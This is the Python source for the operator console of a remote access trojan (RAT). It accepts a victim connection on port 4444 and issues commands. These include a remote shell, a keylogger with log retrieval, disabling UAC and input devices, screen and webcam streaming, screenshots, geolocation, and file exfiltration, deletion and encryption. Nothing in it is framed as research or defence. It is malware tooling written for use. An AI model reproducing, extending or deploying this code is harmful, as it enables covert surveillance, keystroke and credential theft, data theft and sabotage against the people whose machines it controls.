import random
import socket, os

class RAT_SERVER:
    def __init__(self, host, port):
        self.host = host
        self.port = port
    
    def build_connection(self):
        global client, addr, s
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((self.host, self.port))
        s.listen(5)
        print("[*] Waiting for the client...")
        client, addr = s.accept()
        print()
        ipcli = client.recv(1024).decode()
        print(f"[*] Connection is established successfully with {ipcli}")
        print()
    
    def server(self):
        try:
            from vidstream import StreamingServer
            global server
            server = StreamingServer(self.host, 8080)
            server.start_server()
        except:
            print("Module not found...")
    
    def stop_server(self):
        server.stop_server()
    
    def result(self):
        client.send(command.encode())
        result_output = client.recv(1024).decode()
        print(result_output)
    
    def banner(self):
        print("======================================================")
        print("                       Commands                       ")
        print("======================================================")
        print("System: ")
        print("======================================================")
        print(f'''
        help                      Display all available commands
        writein <text>            Write the text to the currently opened window
        browser                   Open a browser with the specified query
        reboot                    Reboot the system
        drivers                   Display all drivers of the system
        kill                      Terminate the specified system task
        cpu_cores                 Display the number of CPU cores
        systeminfo (extended)     Display all basic info about the system (via cmd)
        tasklist                  Display all system tasks
        localtime                 Display the current system time
        curpid                    Display the PID of the client's process
        sysinfo (shrinked)        Display basic system info using Python
        shutdown                  Shut down the client's PC
        isuseradmin               Check if the user has admin privileges
        disableUAC                Disable User Account Control (UAC)
        monitors                  List all used monitors
        geolocate                 Get the location of the computer
        volumeup                  Increase system volume to 100%
        volumedown                Decrease system volume to 0%
        setwallpaper              Set a new wallpaper
        exit                      Terminate the RAT session
        ''')
        print("======================================================")
        print("Shell: ")
        print("======================================================")
        print(f'''
        pwd                       Display the current working directory
        shell                     Execute commands via the command line
        cd                        Change the current directory
        cd ..                     Navigate to the parent directory
        dir                       List all files in the current directory
        abspath                   Get the absolute path of a file or directory
        ''')
        print("======================================================")
        print("Network: ")
        print("======================================================")
        print(f'''
        ipconfig                  Display local IP address
        ''')
        print("======================================================")
        print("Input Devices: ")
        print("======================================================")
        print(f'''
        keyscan_start             Start the keylogger
        send_logs                 Send captured keystrokes to the server
        stop_keylogger            Stop the keylogger
        disable(--keyboard/--mouse/--all) 
                                Disable input devices (keyboard/mouse/all)
        enable(--keyboard/--mouse/--all) 
                                Enable input devices (keyboard/mouse/all)
        ''')
        print("======================================================")
        print("Video: ")
        print("======================================================")
        print(f'''
        screenshare               Stream the remote PC's screen
        breakstream               Stop the screenshare or webcam stream
        screenshot                Capture a screenshot of the remote PC
        ''')
        print("======================================================")
        print("Files: ")
        print("======================================================")
        print(f'''
        delfile <file>            Delete the specified file
        editfile <file> <text>    Edit the specified file by appending text
        createfile <file>         Create a new file
        download <file> <homedir> Download a file from the client
        upload                    Upload a file to the client
        cp <file1> <file2>        Copy a file
        mv <file> <path>          Move a file to a new path
        searchfile <file> <dir>   Search for a file in the specified directory
        mkdir <dirname>           Create a new directory
        rmdir <dirname>           Remove a directory
        startfile <file>          Open the specified file
        readfile <file>           Read the contents of a file
        ''')
        print("======================================================")
        print("New Commands: ")
        print("======================================================")
        print(f'''
        whoami                    Display the current logged-in user
        renamefile <old> <new>    Rename a file
        zipfile <input>           Create a zip file from the specified input
        unzipfile <zipfile>       Extract the contents of a zip file
        clear                     Clear the terminal screen
        encryptfile <input> <output> <key> 
                                Encrypt a file using the specified key
        decryptfile <input> <output> <key> 
                                Decrypt a file using the specified key
        ''')
        print("======================================================")


    def execute(self):
        self.banner()
        while True:
            global command
            command = input('Command >>  ')

            if command == 'shell':
                client.send(command.encode())
                while 1:
                    command = str(input('>> '))
                    client.send(command.encode())
                    if command.lower() == 'exit':
                        break
                    result_output = client.recv(1024).decode()
                    print(result_output)
                client.close()
                s.close()
            
            elif command == 'disableUAC':
                self.result()
            
            elif command == 'reboot':
                self.result()
            
            elif command == 'usbdrivers':
                self.result()
            
            elif command == 'volumeup':
                self.result()
            
            elif command == 'volumedown':
                self.result()
            
            elif command == 'monitors':
                self.result()
            
            elif command[:4] == 'kill':
                if not command[5:]:
                    print("No process mentioned to terminate")
                else:
                    self.result()

            elif command == 'geolocate':
                self.result()
            
            elif command == 'setwallpaper':
                client.send(command.encode())
                text = str(input("Enter the filename: "))
                client.send(text.encode())
                result_output = client.recv(1024).decode()
                print(result_output)
            
            elif command == 'keyscan_start':
                client.send(command.encode())
                result_output = client.recv(1024).decode()
                print(result_output)
            
            elif command == 'send_logs':
                client.send(command.encode())
                result_output = client.recv(1024).decode()
                print(result_output)
            
            elif command == 'stop_keylogger':
                client.send(command.encode())
                result_output = client.recv(1024).decode()
                print(result_output)
            
            elif command[:7] == 'delfile':
                if not command[8:]:
                    print("No file to delete")
                else:
                    self.result()
            
            elif command[:10] == 'createfile':
                if not command[11:]:
                    print("No file to create")
                else:
                    self.result()
            
            elif command == 'tasklist':
                self.result()
            
            elif command == 'ipconfig':
                self.result()
            
            elif command[:7] == 'writein':
                if not command[8:]:
                    print("No text to output")
                else:
                    self.result()
            
            
            elif command == 'cpu_cores':
                self.result()
            
            elif command[:2] == 'cd':
                if not command[3:]: 
                    print("No directory")
                else:
                    self.result()
            
            elif command == 'cd ..':
                self.result()
            
            elif command[1:2] == ':':
                self.result()
            
            elif command == 'dir':
                self.result()
            
            elif command == 'systeminfo':
                self.result()
            
            elif command == 'localtime':
                self.result()
            
            elif command[:7] == 'abspath':
                if not command[8:]:
                    print("No file")
                else:
                    self.result()
            
            elif command[:8] == 'readfile':
                if not command[9:]:
                    print("No file to read")
                else:
                    client.send(command.encode())
                    result_output = client.recv(2147483647).decode()
                    print("===================================================")
                    print(result_output)
                    print("===================================================")
            
            elif command.startswith("disable") and command.endswith("--keyboard"):
                self.result()
            
            elif command.startswith("disable") and command.endswith("--mouse"):
                self.result()
            
            elif command.startswith("disable") and command.endswith("--all"):
                self.result()
            
            elif command.startswith("enable") and command.endswith("--all"):
                self.result()
            
            elif command.startswith("enable") and command.endswith("--keyboard"):
                self.result()
            
            elif command.startswith("enable") and command.endswith("--mouse"):
                self.result()
            
            elif command[:7] == 'browser':
                client.send(command.encode())
                quiery = str(input("Enter the quiery: "))
                client.send(quiery.encode())
                result_output = client.recv(1024).decode()
                print(result_output)
            
            elif command[:2] == 'cp':
                self.result()
            
            elif command[:2] == 'mv':
                self.result()
            
            elif command[:8] == 'editfile':
                self.result()
            
            elif command[:5] == 'mkdir':
                if not command[6:]:
                    print("No directory name")
                else:
                    self.result()
            
            elif command[:5] == 'rmdir':
                if not command[6:]:
                    print("No directory name")
                else:
                    self.result()
            
            elif command[:10] == 'searchfile':
                self.result()
            
            elif command == 'curpid':
                self.result()
            
            elif command == 'sysinfo':
                self.result()
            
            elif command == 'pwd':
                self.result()
            
            elif command == 'screenshare':
                client.send(command.encode("utf-8"))
                self.server()
            
            elif command == 'webcam':
                client.send(command.encode("utf-8"))
                self.server()
            
            elif command == 'breakstream':
                self.stop_server()
            
            elif command[:9] == 'startfile':
                if not command[10:]:
                    print("No file to launch")
                else:
                    self.result()

            elif command[:8] == 'download':
                try:
                    client.send(command.encode())
                    file = client.recv(2147483647)
                    with open(f'{command.split(" ")[2]}', 'wb') as f:
                        f.write(file)
                        f.close()
                    print("File is downloaded")
                except: 
                    print("Not enough arguments")

            elif command == 'upload':
                client.send(command.encode())
                file = str(input("Enter the filepath to the file: "))
                filename = str(input("Enter the filepath to outcoming file (with filename and extension): "))
                data = open(file, 'rb')
                filedata = data.read(2147483647)
                client.send(filename.encode())
                print("File has been sent")
                client.send(filedata)
            
            
            elif command == 'isuseradmin':
                self.result()
            
            elif command == 'help':
                self.banner()
            
            elif command == 'screenshot':
                client.send(command.encode())
                file = client.recv(2147483647)
                path = f'{os.getcwd()}\\{random.randint(11111,99999)}.png'
                with open(path, 'wb') as f:
                    f.write(file)
                    f.close()
                path1 = os.path.abspath(path)
                print(f"File is stored at {path1}")
            
            elif command == 'exit':
                client.send(command.encode())
                output = client.recv(1024)
                output = output.decode()
                print(output)
                s.close()
                client.close()
                
            # New commands
            elif command == 'whoami':
                self.result()
            
            elif command.startswith("zipfile"):
                if len(command.split(" ")) < 2:
                    print("Usage: zipfile <filename>")
                else:
                    self.result()

            elif command.startswith("unzipfile"):
                if len(command.split(" ")) < 2:
                    print("Usage: unzipfile <zip_filename>")
                else:
                    self.result()

            elif command.startswith("renamefile"):
                if len(command.split(" ")) < 3:
                    print("Usage: renamefile <oldfilename> <newfilename>")
                else:
                    self.result()

            elif command == "clear":
                self.result()

            elif command.startswith("encryptfile"):
                if len(command.split(" ")) < 4:
                    print("Usage: encryptfile <input_file> <output_file> <key>")
                else:
                    self.result()

            elif command.startswith("decryptfile"):
                if len(command.split(" ")) < 4:
                    print("Usage: decryptfile <input_file> <output_file> <key>")
                else:
                    self.result()

           
                         
rat = RAT_SERVER('127.0.0.1', 4444)

if __name__ == '__main__':
    rat.build_connection()
    rat.execute()